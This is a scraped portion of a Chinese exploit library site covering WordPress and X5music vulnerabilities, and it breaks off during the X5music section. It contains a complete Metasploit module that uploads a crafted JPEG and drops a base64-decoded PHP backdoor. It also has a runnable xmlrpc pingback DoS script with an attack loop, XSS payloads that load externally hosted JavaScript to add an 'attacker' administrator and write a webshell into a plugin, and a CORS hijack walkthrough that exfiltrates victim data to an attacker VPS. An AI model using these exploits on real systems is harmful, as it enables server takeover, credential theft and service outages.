&meta_input[_wp_page_template]=cropped-32.jpg 点击查看附件页面，如果图片被裁剪之后仍保留敏感代码，则命令执行成功。 四、参考链接 https://www.freebuf.com/vuls/196514.html 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-04 23:50:28 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/8.html":{"url":"0day/Wordpress/8.html","title":"（CVE-2019-8943）WordPress 5.0.3 - Crop-image Shell Upload (Metasploit)","keywords":"","body":"（CVE-2019-8943）WordPress 5.0.3 - Crop-image Shell Upload (Metasploit) 一、漏洞简介 WordPress通过5.0.3允许在wp_crop_image（）中进行路径遍历。攻击者（具有裁剪图像的特权）可以通过包含两个图像扩展名和../序列的文件名，例如以.jpg？/../../结尾的文件名，将输出图像写入任意目录。 file.jpg子字符串。 二、漏洞影响 三、复现过程 保存内容为xxx.md 并放到msf运行的目录下 ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule 'WordPress Crop-image Shell Upload', 'Description' => %q{ This module exploits a path traversal and a local file inclusion vulnerability on WordPress versions 5.0.0 and MSF_LICENSE, 'Author' => [ 'RIPSTECH Technology', # Discovery 'Wilfried Becard ' # Metasploit module ], 'References' => [ [ 'CVE', '2019-8942' ], [ 'CVE', '2019-8943' ], [ 'URL', 'https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/'] ], 'DisclosureDate' => 'Feb 19 2019', 'Platform' => 'php', 'Arch' => ARCH_PHP, 'Targets' => [['WordPress', {}]], 'DefaultTarget' => 0 )) register_options( [ OptString.new('USERNAME', [true, 'The WordPress username to authenticate with']), OptString.new('PASSWORD', [true, 'The WordPress password to authenticate with']) ]) end def check cookie = wordpress_login(username, password) if cookie.nil? store_valid_credential(user: username, private: password, proof: cookie) return CheckCode::Safe end CheckCode::Appears end def username datastore['USERNAME'] end def password datastore['PASSWORD'] end def get_wpnonce(cookie) uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'media-new.php') res = send_request_cgi( 'method' => 'GET', 'uri' => uri, 'cookie' => cookie ) if res && res.code == 200 && res.body && !res.body.empty? res.get_hidden_inputs.first[\"_wpnonce\"] end end def get_wpnonce2(image_id, cookie) uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php') res = send_request_cgi( 'method' => 'GET', 'uri' => uri, 'cookie' => cookie, 'vars_get' => { 'post' => image_id, 'action' => \"edit\" } ) if res && res.code == 200 && res.body && !res.body.empty? tmp = res.get_hidden_inputs wpnonce2 = tmp[1].first[1] end end def get_current_theme uri = normalize_uri(datastore['TARGETURI']) res = send_request_cgi!( 'method' => 'GET', 'uri' => uri ) fail_with(Failure::NotFound, 'Failed to access Wordpress page to retrieve theme.') unless res && res.code == 200 && res.body && !res.body.empty? theme = res.body.scan(/\\/wp-content\\/themes\\/(\\w+)\\//).flatten.first fail_with(Failure::NotFound, 'Failed to retrieve theme') unless theme theme end def get_ajaxnonce(cookie) uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php') res = send_request_cgi( 'method' => 'POST', 'uri' => uri, 'cookie' => cookie, 'vars_post' => { 'action' => 'query-attachments', 'post_id' => '0', 'query[item]' => '43', 'query[orderby]' => 'date', 'query[order]' => 'DESC', 'query[posts_per_page]' => '40', 'query[paged]' => '1' } ) fail_with(Failure::NotFound, 'Unable to reach page to retrieve the ajax nonce') unless res && res.code == 200 && res.body && !res.body.empty? a_nonce = res.body.scan(/\"edit\":\"(\\w+)\"/).flatten.first fail_with(Failure::NotFound, 'Unable to retrieve the ajax nonce') unless a_nonce a_nonce end def upload_file(img_name, wp_nonce, cookie) img_data = %w[ FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 60 00 60 00 00 FF ED 00 38 50 68 6F 74 6F 73 68 6F 70 20 33 2E 30 00 38 42 49 4D 04 04 00 00 00 00 00 1C 1C 02 74 00 10 3C 3F 3D 60 24 5F 47 45 54 5B 30 5D 60 3B 3F 3E 1C 02 00 00 02 00 04 FF FE 00 3B 43 52 45 41 54 4F 52 3A 20 67 64 2D 6A 70 65 67 20 76 31 2E 30 20 28 75 73 69 6E 67 20 49 4A 47 20 4A 50 45 47 20 76 38 30 29 2C 20 71 75 61 6C 69 74 79 20 3D 20 38 32 0A FF DB 00 43 00 06 04 04 05 04 04 06 05 05 05 06 06 06 07 09 0E 09 09 08 08 09 12 0D 0D 0A 0E 15 12 16 16 15 12 14 14 17 1A 21 1C 17 18 1F 19 14 14 1D 27 1D 1F 22 23 25 25 25 16 1C 29 2C 28 24 2B 21 24 25 24 FF DB 00 43 01 06 06 06 09 08 09 11 09 09 11 24 18 14 18 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 FF C0 00 11 08 00 C0 01 06 03 01 22 00 02 11 01 03 11 01 FF C4 00 1F 00 00 01 05 01 01 01 01 01 01 00 00 00 00 00 00 00 00 01 02 03 04 05 06 07 08 09 0A 0B FF C4 00 B5 10 00 02 01 03 03 02 04 03 05 05 04 04 00 00 01 7D 01 02 03 00 04 11 05 12 21 31 41 06 13 51 61 07 22 71 14 32 81 91 A1 08 23 42 B1 C1 15 52 D1 F0 24 33 62 72 82 09 0A 16 17 18 19 1A 25 26 27 28 29 2A 34 35 36 37 38 39 3A 43 44 45 46 47 48 49 4A 53 54 55 56 57 58 59 5A 63 64 65 66 67 68 69 6A 73 74 75 76 77 78 79 7A 83 84 85 86 87 88 89 8A 92 93 94 95 96 97 98 99 9A A2 A3 A4 A5 A6 A7 A8 A9 AA B2 B3 B4 B5 B6 B7 B8 B9 BA C2 C3 C4 C5 C6 C7 C8 C9 CA D2 D3 D4 D5 D6 D7 D8 D9 DA E1 E2 E3 E4 E5 E6 E7 E8 E9 EA F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FF C4 00 1F 01 00 03 01 01 01 01 01 01 01 01 01 00 00 00 00 00 00 01 02 03 04 05 06 07 08 09 0A 0B FF C4 00 B5 11 00 02 01 02 04 04 03 04 07 05 04 04 00 01 02 77 00 01 02 03 11 04 05 21 31 06 12 41 51 07 61 71 13 22 32 81 08 14 42 91 A1 B1 C1 09 23 33 52 F0 15 62 72 D1 0A 16 24 34 E1 25 F1 17 18 19 1A 26 27 28 29 2A 35 36 37 38 39 3A 43 44 45 46 47 48 49 4A 53 54 55 56 57 58 59 5A 63 64 65 66 67 68 69 6A 73 74 75 76 77 78 79 7A 82 83 84 85 86 87 88 89 8A 92 93 94 95 96 97 98 99 9A A2 A3 A4 A5 A6 A7 A8 A9 AA B2 B3 B4 B5 B6 B7 B8 B9 BA C2 C3 C4 C5 C6 C7 C8 C9 CA D2 D3 D4 D5 D6 D7 D8 D9 DA E2 E3 E4 E5 E6 E7 E8 E9 EA F2 F3 F4 F5 F6 F7 F8 F9 FA FF DA 00 0C 03 01 00 02 11 03 11 00 3F 00 3C 3F 3D 60 24 5F 47 45 54 5B 30 5D 60 3B 3F 3E ] img_data = [img_data.join].pack('H*') img_name += '.jpg' boundary = \"#{rand_text_alphanumeric(rand(10) + 5)}\" post_data = \"--#{boundary}\\r\\n\" post_data 'POST', 'uri' => upload_uri, 'ctype' => \"multipart/form-data; boundary=#{boundary}\", 'data' => post_data, 'cookie' => cookie ) fail_with(Failure::UnexpectedReply, 'Unable to upload image') unless res && res.code == 200 && res.body && !res.body.empty? print_good(\"Image uploaded\") res = JSON.parse(res.body) image_id = res[\"data\"][\"id\"] update_nonce = res[\"data\"][\"nonces\"][\"update\"] filename = res[\"data\"][\"filename\"] return filename, image_id, update_nonce end def image_editor(img_name, ajax_nonce, image_id, cookie) uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php') res = send_request_cgi( 'method' => 'POST', 'uri' => uri, 'cookie' => cookie, 'vars_post' => { 'action' => 'image-editor', '_ajax_nonce' => ajax_nonce, 'postid' => image_id, 'history' => '[{\"c\":{\"x\":0,\"y\":0,\"w\":400,\"h\":300}}]', 'target' => 'all', 'context' => '', 'do' => 'save' } ) fail_with(Failure::NotFound, 'Unable to access page to retrieve filename') unless res && res.code == 200 && res.body && !res.body.empty? filename = res.body.scan(/(#{img_name}-\\S+)-/).flatten.first fail_with(Failure::NotFound, 'Unable to retrieve file name') unless filename filename 'POST', 'uri' => uri, 'cookie' => cookie, 'vars_post' => { '_wpnonce' => wpnonce2, 'action' => 'editpost', 'post_ID' => image_id, 'meta_input[_wp_attached_file]' => \"#{current_date}#{filename}#{path}\" } ) end def crop_image(image_id, ajax_nonce, cookie) uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php') res = send_request_cgi( 'method' => 'POST', 'uri' => uri, 'cookie' => cookie, 'vars_post' => { 'action' => 'crop-image', '_ajax_nonce' => ajax_nonce, 'id' => image_id, 'cropDetails[x1]' => 0, 'cropDetails[y1]' => 0, 'cropDetails[width]' => 400, 'cropDetails[height]' => 300, 'cropDetails[dst_width]' => 400, 'cropDetails[dst_height]' => 300 } ) end def include_theme(shell_name, cookie) uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post-new.php') res = send_request_cgi( 'method' => 'POST', 'uri' => uri, 'cookie' => cookie ) if res && res.code == 200 && res.body && !res.body.empty? wpnonce2 = res.body.scan(/name=\"_wpnonce\" value=\"(\\w+)\"/).flatten.first post_id = res.body.scan(/\"post\":{\"id\":(\\w+),/).flatten.first fail_with(Failure::NotFound, 'Unable to retrieve the second wpnonce and the post id') unless wpnonce2 && post_id post_title = Rex::Text.rand_text_alpha(10) uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php') res = send_request_cgi( 'method' => 'POST', 'uri' => uri, 'cookie' => cookie, 'vars_post' => { '_wpnonce'=> wpnonce2, 'action' => 'editpost', 'post_ID' => post_id, 'post_title' => post_title, 'post_name' => post_title, 'meta_input[_wp_page_template]' => \"cropped-#{shell_name}.jpg\" } ) fail_with(Failure::NotFound, 'Failed to retrieve post id') unless res && res.code == 302 post_id end end def check_for_base64(cookie, post_id) uri = normalize_uri(datastore['TARGETURI']) # Test if base64 is on target test_string = 'YmFzZTY0c3BvdHRlZAo=' res = send_request_cgi!( 'method' => 'GET', 'uri' => uri, 'cookie' => cookie, 'vars_get' => { 'p' => post_id, '0' => \"echo #{test_string} | base64 -d\" } ) fail_with(Failure::NotFound, 'Unable to retrieve response to base64 command') unless res && res.code == 200 && !res.body.empty? fail_with(Failure::NotFound, \"Can't find base64 decode on target\") unless res.body.include?(\"base64spotted\") # Execute payload with base64 decode @backdoor = Rex::Text.rand_text_alpha(10) encoded = Rex::Text.encode_base64(payload.encoded) res = send_request_cgi!( 'method' => 'GET', 'uri' => uri, 'cookie' => cookie, 'vars_get' => { 'p' => post_id, '0' => \"echo #{encoded} | base64 -d > #{@backdoor}.php\" } ) fail_with(Failure::NotFound, 'Failed to send payload to target') unless res && res.code == 200 && !res.body.empty? send_request_cgi( 'method' => 'GET', 'uri' => normalize_uri(datastore['TARGETURI'], \"#{@backdoor}.php\"), 'cookie' => cookie ) end def wp_cleanup(shell_name, post_id, cookie) print_status('Attempting to clean up files...') uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php') res = send_request_cgi( 'method' => 'POST', 'uri' => uri, 'cookie' => cookie, 'vars_post' => { 'action' => \"query-attachments\" } ) fail_with(Failure::NotFound, 'Failed to receive a response for uploaded file') unless res && res.code == 200 && !res.body.empty? infos = res.body.scan(/id\":(\\d+),.*filename\":\"cropped-#{shell_name}\".*?\"delete\":\"(\\w+)\".*\"id\":(\\d+),.*filename\":\"cropped-x\".*?\"delete\":\"(\\w+)\".*\"id\":(\\d+),.*filename\":\"#{shell_name}\".*?\"delete\":\"(\\w+)\"/).flatten id1, id2, id3 = infos[0], infos[2], infos[4] delete_nonce1, delete_nonce2, delete_nonce3 = infos[1], infos[3], infos[5] for i in (0...6).step(2) res = send_request_cgi( 'method' => 'POST', 'uri' => uri, 'cookie' => cookie, 'vars_post' => { 'action' => \"delete-post\", 'id' => infos[i], '_wpnonce' => infos[i+1] } ) end uri1 = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'edit.php') res = send_request_cgi( 'method' => 'GET', 'uri' => uri1, 'cookie' => cookie ) if res && res.code == 200 && res.body && !res.body.empty? post_nonce = res.body.scan(/post=#{post_id}&action=trash&_wpnonce=(\\w+)/).flatten.first fail_with(Failure::NotFound, 'Unable to retrieve post nonce') unless post_nonce uri2 = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php') res = send_request_cgi( 'method' => 'GET', 'uri' => uri2, 'cookie' => cookie, 'vars_get' => { 'post' => post_id, 'action' => 'trash', '_wpnonce' => post_nonce } ) fail_with(Failure::NotFound, 'Unable to retrieve response') unless res && res.code == 302 res = send_request_cgi( 'method' => 'GET', 'uri' => uri1, 'cookie' => cookie, 'vars_get' => { 'post_status' => \"trash\", 'post_type' => 'post', '_wpnonce' => post_nonce } ) if res && res.code == 200 && res.body && !res.body.empty? nonce = res.body.scan(/post=#{post_id}&action=delete&_wpnonce=(\\w+)/).flatten.first fail_with(Failure::NotFound, 'Unable to retrieve nonce') unless nonce send_request_cgi( 'method' => 'GET', 'uri' => uri2, 'cookie' => cookie, 'vars_get' => { 'post' => post_id, 'action' => 'delete', '_wpnonce' => nonce } ) end end end def exploit fail_with(Failure::NotFound, 'The target does not appear to be using WordPress') unless wordpress_and_online? print_status(\"Authenticating with WordPress using #{username}:#{password}...\") cookie = wordpress_login(username, password) fail_with(Failure::NoAccess, 'Failed to authenticate with WordPress') if cookie.nil? print_good(\"Authenticated with WordPress\") store_valid_credential(user: username, private: password, proof: cookie) print_status(\"Preparing payload...\") @current_theme = get_current_theme wp_nonce = get_wpnonce(cookie) @current_date = Time.now.strftime(\"%Y/%m/\") img_name = Rex::Text.rand_text_alpha(10) @filename1, image_id, update_nonce = upload_file(img_name, wp_nonce, cookie) ajax_nonce = get_ajaxnonce(cookie) @filename1 = image_editor(img_name, ajax_nonce, image_id, cookie) wpnonce2 = get_wpnonce2(image_id, cookie) change_path(wpnonce2, image_id, @filename1, @current_date, '?/x', cookie) crop_image(image_id, ajax_nonce, cookie) @shell_name = Rex::Text.rand_text_alpha(10) change_path(wpnonce2, image_id, @filename1, @current_date, \"?/../../../../themes/#{@current_theme}/#{@shell_name}\", cookie) crop_image(image_id, ajax_nonce, cookie) print_status(\"Including into theme\") post_id = include_theme(@shell_name, cookie) check_for_base64(cookie, post_id) wp_cleanup(@shell_name, post_id, cookie) end def on_new_session(client) client.shell_command_token(\"rm wp-content/uploads/#{@current_date}#{@filename1[0...10]}*\") client.shell_command_token(\"rm wp-content/uploads/#{@current_date}cropped-#{@filename1[0...10]}*\") client.shell_command_token(\"rm -r wp-content/uploads/#{@current_date}#{@filename1[0...10]}*\") client.shell_command_token(\"rm wp-content/themes/#{@current_theme}/cropped-#{@shell_name}.jpg\") client.shell_command_token(\"rm #{@backdoor}.php\") end end 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-14 13:28:42 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/6.html":{"url":"0day/Wordpress/6.html","title":"（CVE-2019-16219）WordPress 5.2.3 内置编辑器Gutenberg 储存型xss","keywords":"","body":"（CVE-2019-16219）WordPress 5.2.3 内置编辑器Gutenberg 储存型xss 一、漏洞简介 Gutenberg编辑器无法过滤“简码”错误消息中的JavaScript / HTML代码，导致可执行任意JavaScript / HTML代码 二、漏洞影响 WordPress 5.2.3 三、复现过程 在WordPress 5.0中，用户可以在帖子中添加Shortcode块。当在Shortcode块中添加某些HTML编码字符（例如“＆lt;”），然后重新打开该帖子时，它将显示错误消息，并通过将“＆lt;”解码为“ 图1.将HTML编码的字符插入Shortcode块 图2.带有预览的Shortcode错误消息 可以通过PoC \"&gt;&lt;img src=1 onerror=prompt(1)&gt; 轻松绕过此预览中的XSS过滤器。 图3.将PoC代码插入Shortcode块 当任何受害者查看此帖子时，XSS代码将在其浏览器中执行。 如果受害者恰巧具有管理员权限，则攻击者可以利用此漏洞来控制管理员的帐户，将WordPress内置功能用于GetShell，然后控制服务器。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-14 13:35:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/10.html":{"url":"0day/Wordpress/10.html","title":"（CVE-2019-17671）Wordpress <= 5.2.3未授权访问","keywords":"","body":"（CVE-2019-17671）Wordpress 一、漏洞简介 wordpress 爆出最新的查看未经身份验证的文章漏洞， 该漏洞源于程序没有正确处理静态查询， 攻击者可利用该漏洞未经认证查看部分内容 二、漏洞影响 WordPress 三、复现过程 登陆后台新建私密页面 随便填入内容，选择私密，发布 访问前台页面，退出登陆，模拟外部访问 漏洞利用 直接访问，查看不了私密文章 输入payload访问，即可未授权访问所有文章 url+/?static=1&order=asc 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-14 13:30:21 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/27.html":{"url":"0day/Wordpress/27.html","title":"Wordpress 5.2.4 cors跨域劫持漏洞","keywords":"","body":"Wordpress 5.2.4 cors跨域劫持漏洞 一、漏洞简介 CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。通过该标准，可以允许浏览器向跨源服务器发出 XMLHttpRequest 请求，从而克服了AJAX只能同源使用的限制，进而读取跨域的资源。CORS允许Web服务器通知Web浏览器应该允许哪些其他来源从该Web服务器的回复中访问内容 漏洞产生原因：在Access-Control-Allow-Origin中反射请求的Origin值。该配置可导致任意攻击者网站可以直接跨域读取其资源内容。 二、漏洞影响 Wordpress 5.2.4 三、复现过程 1、影响版本wordpress5.2.4，首先访问首页，利用burp抓包 2、然后发送到reapeter，日常go一下，看到返回包内容，返回了/wp-json 3、我们将请求包中的url补上/wp-json，再次发包，发现出现了一堆json数据，我们将其复制到jsonbeautiful进行格式化，说明漏洞出现在：http://www.0-sec.org/wp-json， 4、我们在请求包中，加入orgin头http://192.168.1.7（实战中为你的vps），再次发送， 发现响应头内的 Access-Control-Allow-Origin:已经变成http://192.168.1.7，并且且Access-Control-Allow-Credentials:的值为true。 从而证明是存在cors漏洞的，我们可以进行cors跨域劫持 5、然后我们利用pocbox构造payload，输入漏洞链接(记住！！记住！！！加上http://)，选择http请求方法即可 6、然后将生成的html内容，放到你的vps下，命名为wp-cors.html 7、然后诱骗受害者点击，就会把json数据传到你的服务器，从而获取对方敏感信息，攻击成功 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-01 00:52:55 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/13.html":{"url":"0day/Wordpress/13.html","title":"WordPress <=5.3.0 xmlrpc.php拒绝服务漏洞","keywords":"","body":"WordPress 一、漏洞简介 二、漏洞影响 WordPress 三、复现过程 漏洞文件 /wordpress/xmlrpc.php /wp/xmlrpc.php from urllib.parse import urlparse import sys, uuid, urllib3, requests urllib3.disable_warnings() DEBUG = True def dprint(X): if DEBUG: print(X) COUNT=0 def build_entry(pingback,target): global COUNT COUNT +=1 entry = \"methodNamepingback.ping\" entry += f\"params{pingback}/{COUNT}\" #entry += f\"params{pingback}/{uuid.uuid4()}\" entry += f\"{target}/?p=1\" #entry += f\"{target}/#e\" # taxes DB more return entry def build_request(pingback,target,entries): prefix = \"system.multicall\" suffix = \"\" request = prefix for _ in range(0,entries): request += build_entry(pingback,target) request += suffix return request def usage_die(): print(f\"[!] Usage: {sys.argv[0]} \") exit(1) def get_args(): if len(sys.argv) != 4: usage_die() action = sys.argv[1] pingback = sys.argv[2] target = sys.argv[3] if action not in (\"check\",\"attack\"): usage_die() for URL in (pingback,target): res = urlparse(URL) if not all((res.scheme,res.netloc)): usage_die() return (action,pingback,target) def main(action,pingback,target): print(\"[>] WordPress ] @roddux 2019 | Arcturus Security | labs.arcturus.net\") # he checc if action == \"check\": entries = 2 # he attacc elif action == \"attack\": entries = 2000 # but most importantly print(f\"[+] Running in {action} mode\") # he pingbacc print(f\"[+] Got pingback URL \\\"{pingback}\\\"\") print(f\"[+] Got target URL \\\"{target}\\\"\") print(f\"[+] Building {entries} pingback calls\") # entries = 1000 # TESTING xmldata = build_request(pingback,target,entries) dprint(\"[+] Request:\\n\") dprint(xmldata+\"\\n\") print(f\"[+] Request size: {len(xmldata)} bytes\") if action == \"attack\": print(\"[+] Starting attack loop, CTRL+C to stop...\") rcount = 0 try: while True: try: resp = requests.post(f\"{target}/xmlrpc.php\", xmldata, verify=False, allow_redirects=False, timeout=.2) #dprint(resp.content.decode(\"UTF-8\")[0:500]+\"\\n\") if resp.status_code != 200: print(f\"[!] Received odd status ({resp.status_code}) -- DoS successful?\") except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e: pass rcount += 1 print(f\"\\r[+] Requests sent: {rcount}\",end=\"\") except KeyboardInterrupt: print(\"\\n[>] Attack finished\",end=\"\\n\\n\") exit(0) elif action == \"check\": print(\"[+] Sending check request\") try: resp = requests.post(f\"{target}/xmlrpc.php\", xmldata, verify=False, allow_redirects=False, timeout=10) if resp.status_code != 200: print(f\"[!] Received odd status ({resp.status_code}) -- check target url\") print(\"[+] Request sent\") print(\"[+] Response headers:\\n\") print(resp.headers) print(\"[+] Response dump:\") print(resp.content.decode(\"UTF-8\")) print(\"[+] Here's the part where you figure out if it's vulnerable, because I CBA to code it\") except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e: print(\"[!] Connection error\") exit(1) print(\"[>] Check finished\") if __name__ == \"__main__\": main(*get_args()) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-14 13:49:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/1.html":{"url":"0day/Wordpress/1.html","title":"（CVE-2019-16773）WordPress 5.3.0 储存型xss","keywords":"","body":"（CVE-2019-16773）WordPress 5.3.0 储存型xss 一、漏洞简介 WordPress是WordPress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。 WordPress 3.7版本至5.3.0版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。 二、漏洞影响 WordPress 3.7版本至5.3.0 三、复现过程 如果论坛用户的个人资料显示在其个人资料页面中，则此方法有效。以管理员身份登录并转到外观->自定义，然后进入BuddyPress Nouveu->成员首页，并确保启用了显示用户个人资料的功能 创建普通论坛用户帐户 登录并编辑您的个人资料。将用户描述修改为一下代码 This is a PoC for a Stored XSS 访问您的配置文件并将鼠标悬停在链接上。 参考链接 https://hackerone.com/reports/509930 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-14 13:48:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/7.html":{"url":"0day/Wordpress/7.html","title":"（从xss到getshell） xss的深层次利用与探讨","keywords":"","body":"（从xss到getshell） xss的深层次利用与探讨 今天我们的网站上公布了大量的wp的xss，那么这篇文章就是深入探讨如何深入利用xss。 如果师傅们有什么新的思路或者姿势。可以通过邮箱联系我们进行讨论与交流 联系邮箱：ian@lcx.cc 通过js文件添加wp系统管理员 1、创建管理账号 举个例子，攻击者可以在其Web服务器上托管JavaScript文件，例如wpaddadmin [.] js（在链接中描述）。此JavaScript代码将添加一个WordPress管理员帐户，其用户名为“ attacker”，密码为“ attacker”。 // Send a GET request to the URL '/wordpress/wp-admin/user-new.php', and extract the current 'nonce' value var ajaxRequest = new XMLHttpRequest(); var requestURL = \"/wordpress/wp-admin/user-new.php\"; var nonceRegex = /ser\" value=\"([^\"]*?)\"/g; ajaxRequest.open(\"GET\", requestURL, false); ajaxRequest.send(); var nonceMatch = nonceRegex.exec(ajaxRequest.responseText); var nonce = nonceMatch[1]; // Construct a POST query, using the previously extracted 'nonce' value, and create a new user with an arbitrary username / password, as an Administrator var params = \"action=createuser&_wpnonce_create-user=\"+nonce+\"&user_login=attacker&email=attacker@site.com&pass1=attacker&pass2=attacker&role=administrator\"; ajaxRequest = new XMLHttpRequest(); ajaxRequest.open(\"POST\", requestURL, true); ajaxRequest.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\"); ajaxRequest.send(params); 然后，攻击者可以使用以下PoC插入JavaScript。 “\"&gt;&lt;img src=1 onerror=\"javascript&colon;(function () { var url = 'http://aaa.bbb.ccc.ddd/ wpaddadmin.js';if (typeof beef == 'undefined') { var bf = document.createElement('script'); bf.type = 'text/javascript'; bf.src = url; document.body.appendChild(bf);}})();\"&gt;” 图1.插入XSS代码以添加管理员帐户 具有高权限的受害者查看此帖子后，将创建管理员帐户“攻击者”。 图2. XSS代码被执行 图3. XSS代码创建的具有管理员权限的“攻击者”帐户 然后，攻击者可以将现有的php文件修改为Webshel​​l，并使用该Webshel​​l来控制Web服务器。 图4.使用攻击者的帐户添加一个Web Shell 图5.控制Web服务器 2、恶意命令执行 // Send a GET request to the URL '/wp-admin/plugin-editor.php?akisment/index.php', and extract the current 'nonce' value var ajaxRequest = new XMLHttpRequest(); var requestURL = \"/wp-admin/plugin-editor.php?file=akismet/index.php\" var nonceRegex = /ce\" value=\"([^\"]*?)\"/g; ajaxRequest.open(\"GET\", requestURL, false); ajaxRequest.send(); var nonceMatch = nonceRegex.exec(ajaxRequest.responseText); var nonce = nonceMatch[1]; // Construct a POST query, using the previously extracted 'nonce' value, and update the content of the file 'akismet/index.php' with our tiny web shell var params = \"_wpnonce=\"+nonce+\"&newcontent=一旦此XSS被管理用户触发，我们应该能够通过向脚本 http://0-sec.org/wp-content/plugins/akismet/index.php 发送GET / POST请求来执行任意PHP代码，其中参数“ x”等于我们的PHP代码的“ base64_encode”。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 16:11:59 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/X5music/1.html":{"url":"0day/X5music/1.html","title":"X5music 后台登陆绕过+后台getshell","keywords":"","body":"X5music 后台登陆绕过+后台getshell 一、漏洞简介 二、漏洞影响 三、复现过程 登录绕过 后台登陆验证逻辑存在问题 在/admin/admin_login.php中 if($action==\"login\") { $CD_Name=SafeRequest(\"CD_AdminUserName\", \"post\"); $CD_Pass=md5(SafeRequest(\"CD_AdminPassWord\", \"post\")); $CD_Code=SafeRequest(\"CD_CheckCode\", \"post\"); $logtime=date('Y-m-d H:i:s'); global $db; if(cd_webcodea=='yes') { if($CD_Code!=cd_webcodeb) { showmessage(\"登录失败,认证码错误！\", \"admin_login.php\", 0); } } $sql=\"Select CD_ID from \" . tname('admin') . \" where CD_AdminUserName='\" . $CD_Name . \"' and CD_AdminPassWord='\" . $CD_Pass . \"' and CD_IsLock=0\"; $CD_ID=$db->Getone($sql); //从数据库中返回1 if($CD_ID) { $db->query(\"update \" . tname('admin') . \" set CD_LoginNum =CD_LoginNum +1,CD_LoginIP='\" . $_SERVER['SERVER_ADDR'] . \"',CD_LastLogin ='\" . $logtime . \"' where CD_ID='\" . $CD_ID . \"'\"); $row=$db->Getrow(\"Select * from \" . tname('admin') . \" where CD_ID='\" . $CD_ID . \"' \"); setcookie(\"CD_AdminID\", $row['CD_ID']); setcookie(\"CD_AdminUserName\", $row['CD_AdminUserName']); setcookie(\"CD_AdminPassWord\", md5($row['CD_AdminPassWord'])); setcookie(\"CD_Permission\", $row['CD_Permission']); setcookie(\"CD_Login\", md5($row['CD_ID'] . $row['CD_AdminUserName'] . md5($row['CD_AdminPassWord']) . $row['CD_Permission'])); //showmessage(\"成功登录，正在转向后台管理主页！\", \"admin_index.php\", 0); echo'window.parent.location.href=\"admin_index.php\";'; } else { showmessage(\"登录失败请确认输入的是正确信息以及帐号是否开启!\", \"admin_login.php\", 0); } } 在登陆成功后设置cookies，没有任何session等服务端验证存储方式。 然后再看登录后验证是否登陆的逻辑。跟入admin_index.php 验证是否登陆的为admincheck()这个函数。 跟进/function_common.php查看 function admincheck($value) { if(empty($_COOKIE['CD_AdminID']) || empty($_COOKIE['CD_Login']) || $_COOKIE['CD_Login']!==md5($_COOKIE['CD_AdminID'] . $_COOKIE['CD_AdminUserName'] . $_COOKIE['CD_AdminPassWord'] . $_COOKIE['CD_Permission'])) { showmessage(\"出错了，登录已过期，请重新登录！\", \"admin_login.php\", 0); } if(!empty($_COOKIE['CD_Permission'])) { $array=explode(\",\", $_COOKIE['CD_Permission']); $adminlogined=false; for($i=0; $i 其中if(empty($_COOKIE['CD_AdminID']) || empty($_COOKIE['CD_Login']) || $_COOKIE['CD_Login']!==md5($_COOKIE['CD_AdminID'] . $_COOKIE['CD_AdminUserName'] . $_COOKIE['CD_AdminPassWord'] . $_COOKIE['CD_Permission']))判断cookies：CD_Admin,CD_Login是否存在。然后拼接cookies：CD_AdminID，CD_AdminUserName，CD_AdminPassWord，CD_Permission后对其组成的字符串进行md5后和CD_Login的值进行比对。 